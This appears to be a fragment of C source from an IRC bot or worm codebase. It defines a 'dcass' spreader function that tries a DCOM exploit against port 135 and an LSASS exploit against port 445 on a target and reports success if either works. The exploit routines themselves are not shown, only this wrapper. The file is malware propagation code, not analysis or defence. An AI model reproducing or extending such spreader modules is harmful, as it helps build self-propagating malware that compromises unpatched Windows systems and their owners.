#include "../h/includes.h"
#include "../h/functions.h"
#include "../h/externs.h"

#ifndef NO_LSASS
#ifndef NO_DCOM
#ifndef NO_DCASS
BOOL dcass(EXINFO exinfo)
{
	exinfo.port = 135;
	BOOL bDCOM = Dcom(exinfo);
	exinfo.port = 445;
	BOOL bLSASS = lsass(exinfo);

	return bDCOM || bLSASS ? TRUE : FALSE;
}
#endif
#endif
#endif